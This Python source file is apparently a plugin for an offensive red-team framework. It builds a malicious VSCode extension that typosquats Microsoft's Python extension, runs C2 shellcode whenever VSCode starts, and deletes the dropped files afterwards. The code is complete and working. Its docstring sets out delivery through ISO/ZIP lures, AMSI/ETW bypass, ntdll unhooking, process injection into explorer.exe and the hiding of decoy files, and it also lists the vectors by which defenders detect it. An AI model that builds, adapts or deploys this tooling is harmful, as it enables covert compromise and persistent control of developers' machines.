"""
Erebus Plugin - VSCode Extension Trigger
Author: Whispergate
Description: Packages Mythic shellcode as a malicious VSCode .vsix extension.
             Uses the Erebus.Loader DLL compiled by the main builder (all
             Mythic parameters applied) loaded via Node.js require() -
             no PowerShell, no AMSI, no child processes.

Technique: MDSec - Leveraging VSCode Extensions for Initial Access (2023)
MITRE:     T1204.002 - User Execution: Malicious File
           T1546     - Event Triggered Execution (onStartupFinished persistence)

Delivery:  ISO/ZIP container -> victim double-clicks installer.vsix ->
           code --install-extension fires -> onStartupFinished activates ->
           shellcode executes on every subsequent VSCode launch (free persistence)

Windows execution path (preferred):
  require('./payload.node') -> LoadLibrary -> DllMain(DLL_PROCESS_ATTACH) ->
  NtCreateThreadEx(EntryThread) -> entry() -> evasion patches + injection.
  payload.node IS the Erebus.Loader DLL (full injection methods, AMSI/ETW
  bypass, ntdll unhook, guardrails) built with TARGET=dll from the Makefile.
  Default injection: EarlyCascade into explorer.exe - shellcode runs in a
  clean host process, not in code.exe itself.

Linux/macOS execution path:
  tmpfs write (mode 0700) + detached exec, file scrubbed after 8s.

OPSEC Notes:
  - Windows: no PS child process; shellcode runs in target process (not code.exe)
  - Full Erebus evasion stack: AMSI/ETW bypass, ntdll unhook, NtCreateThreadEx
  - Shellcode + DLL inside .vsix ZIP - rarely scanned at rest
  - Extension persists in ~/.vscode/extensions/ - no registry, no scheduled task
  Detection vectors:
  - .vsix side-load (no marketplace origin) - MDE flags this
  - code.exe -> NtCreateThreadEx(explorer.exe) cross-process injection
  Evasion Maturity: Level 4
"""

import json
import os
import pathlib
import random
import shutil
import string
import subprocess
import stat
import sys
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class VsCodeExtTriggerPlugin(ErebusPlugin):
    """
    VSCode extension trigger using the Erebus.Loader DLL loaded via Node.js require().
    Full injection stack (EarlyCascade/PoolParty/etc.), AMSI/ETW bypass, ntdll unhook.
    payload.node is supplied by the main builder — no compile happens here.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT   = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE  = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"
        self.DECOY_FILE  = self.AGENT_CODE / "decoys" / "decoy.pdf"
        self.TEMPLATE_DIR = self.AGENT_CODE / "templates"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="vscode_ext_trigger",
            version="3.0.0",
            author="Whispergate",
            description="Packages shellcode as a malicious VSCode .vsix using Erebus.Loader DLL (no PowerShell)",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_vscode_ext_trigger": self.create_vscode_ext_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        for tool in ("node", "npm", "vsce"):
            if not shutil.which(tool):
                return (False, f"Required tool not on PATH: '{tool}' - check Dockerfile")
        return (True, None)

    def on_load(self):
        print("[Plugin] VSCode Extension Trigger loaded")

    # ================================================================
    # Core plugin function
    # ================================================================

    def create_vscode_ext_trigger(
        self,
        shellcode_path: pathlib.Path,
        payload_dir: Optional[pathlib.Path] = None,
        decoy_file: Optional[pathlib.Path] = None,
        # [MALLEABLE] Typosquat identity shown in VSCode Extensions panel
        fake_name: str = "vscode-python-tools",
        publisher: str = "ms-python",
        display_name: str = "Python Language Support",
        description: str = "Python IntelliSense, linting, debugging, and formatting.",
        output_filename: str = "installer.vsix",
        # Pre-compiled DLL from the main builder (uses all Mythic parameters).
        prebuilt_dll_path: Optional[pathlib.Path] = None,
        # Optional PNG icon shown in the VSCode Extensions panel.
        custom_icon_path: Optional[pathlib.Path] = None,
    ) -> pathlib.Path:
        """
        Build a .vsix extension that silently executes shellcode on VSCode startup.

        Windows: copies prebuilt_dll_path as payload.node (the Erebus.Loader DLL
        compiled by the main builder with all Mythic UI parameters applied).
        DllMain fires on require(), launching NtCreateThreadEx → entry() → injection.

        Linux/macOS: writes shellcode to tmpfs (mode 0700), spawns detached,
        scrubs after 8s.
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        shellcode_bytes = pathlib.Path(shellcode_path).read_bytes()
        rand_name = "".join(random.choices(string.ascii_lowercase, k=10))

        stage_dir = payload_dir / f".vscode_stage_{rand_name}"
        stage_dir.mkdir(parents=True, exist_ok=True)
        (stage_dir / "out").mkdir(exist_ok=True)

        try:
            if prebuilt_dll_path is None or not pathlib.Path(prebuilt_dll_path).exists():
                raise RuntimeError(
                    "VSCode trigger requires a prebuilt DLL from the main builder "
                    "(loader_format=dll). prebuilt_dll_path was not provided or does not exist."
                )
            shutil.copy(str(prebuilt_dll_path), str(stage_dir / "out" / "payload.node"))

            # package.json
            manifest = {
                "name": fake_name,
                "publisher": publisher,
                "displayName": display_name,
                "description": description,
                "version": "1.0.0",
                "engines": {"vscode": "^1.60.0"},
                "activationEvents": ["onStartupFinished"],
                "main": "./out/extension.js",
                "contributes": {},
            }

            if custom_icon_path is not None and pathlib.Path(custom_icon_path).exists():
                shutil.copy(str(custom_icon_path), str(stage_dir / "icon.png"))
                manifest["icon"] = "icon.png"

            (stage_dir / "package.json").write_text(
                json.dumps(manifest, indent=2), encoding="utf-8"
            )

            (stage_dir / "out" / "extension.js").write_text(
                self._render_extension_js(shellcode_bytes, rand_name),
                encoding="utf-8",
            )

            (stage_dir / ".vscodeignore").write_text(
                "node_modules/**\n.vscode/**\n*.ts\nsrc/**\n*.c\n",
                encoding="utf-8",
            )

            vsix_out = payload_dir / output_filename
            try:
                subprocess.run(
                    ["vsce", "package", "--no-dependencies", "--out", str(vsix_out)],
                    cwd=stage_dir,
                    check=True,
                    capture_output=True,
                )
            except subprocess.CalledProcessError as e:
                raise RuntimeError(
                    f"vsce packaging failed: {e.stderr.decode(errors='replace')}"
                ) from e
        finally:
            shutil.rmtree(stage_dir, ignore_errors=True)

        if decoy_file is None:
            decoy_file = self.DECOY_FILE
        if pathlib.Path(decoy_file).exists():
            self._set_hidden(pathlib.Path(decoy_file))

        return vsix_out

    # ================================================================
    # extension.js renderer
    # ================================================================

    def _render_extension_js(self, shellcode_bytes: bytes, rand_name: str) -> str:
        """
        Render extension.js.

        Windows: copy bundled DLL to %TEMP%\\<rand>.dll, spawn `regsvr32 /s`
        detached. regsvr32 LoadLibrary fires DllMain (kicks EntryThread), then
        calls DllRegisterServer which blocks on EntryThread until injection
        completes. Code.exe never loads the DLL — host process stays clean.

        Linux/macOS: tmpfs write + detached exec, scrubbed after 8s.
        """
        import base64
        shellcode_b64 = base64.b64encode(shellcode_bytes).decode()

        return (
            "'use strict';\n"
            "const vscode = require('vscode');\n"
            "const cp     = require('child_process');\n"
            "const fs     = require('fs');\n"
            "const os     = require('os');\n"
            "const path   = require('path');\n"
            "\n"
            "function activate(context) {\n"
            "    _run(context);\n"
            "}\n"
            "\n"
            "function _run(context) {\n"
            "    try {\n"
            "        if (os.platform() === 'win32') {\n"
            "            // Copy bundled DLL to %TEMP% with a random name, then\n"
            "            // spawn regsvr32 /s detached. Evasion + injection happen\n"
            "            // inside regsvr32, NOT inside Code.exe extension host.\n"
            f"            const dst = path.join(os.tmpdir(), '{rand_name}' + '.dll');\n"
            "            try { fs.copyFileSync(path.join(context.extensionPath, 'out', 'payload.node'), dst); } catch(_) { return; }\n"
            "            try {\n"
            "                cp.spawn('regsvr32.exe', ['/s', dst], {\n"
            "                    detached: true, stdio: 'ignore', windowsHide: true,\n"
            "                }).unref();\n"
            "            } catch(_) {}\n"
            "            // Scrub the dropped DLL after injection has had time to finish.\n"
            "            setTimeout(() => { try { fs.unlinkSync(dst); } catch(_) {} }, 45000);\n"
            "        } else {\n"
            "            // Linux / macOS: tmpfs write + detached exec, scrub after 8s\n"
            f"            const sc  = Buffer.from('{shellcode_b64}', 'base64');\n"
            f"            const bin = path.join(os.tmpdir(), '.' + '{rand_name}');\n"
            "            fs.writeFileSync(bin, sc, { mode: 0o700 });\n"
            "            cp.spawn(bin, [], { detached: true, stdio: 'ignore' }).unref();\n"
            "            setTimeout(() => { try { fs.unlinkSync(bin); } catch(_) {} }, 8000);\n"
            "        }\n"
            "    } catch (_) {}\n"
            "}\n"
            "\n"
            "function deactivate() {}\n"
            "\n"
            "module.exports = { activate, deactivate };\n"
        )

    @staticmethod
    def _set_hidden(file_path: pathlib.Path):
        """Mirror of the hidden-file pattern used across Erebus trigger plugins."""
        try:
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(str(file_path), 0x02)
            else:
                os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR)
        except Exception:
            pass


# Module-level instance for plugin auto-discovery
_plugin = VsCodeExtTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
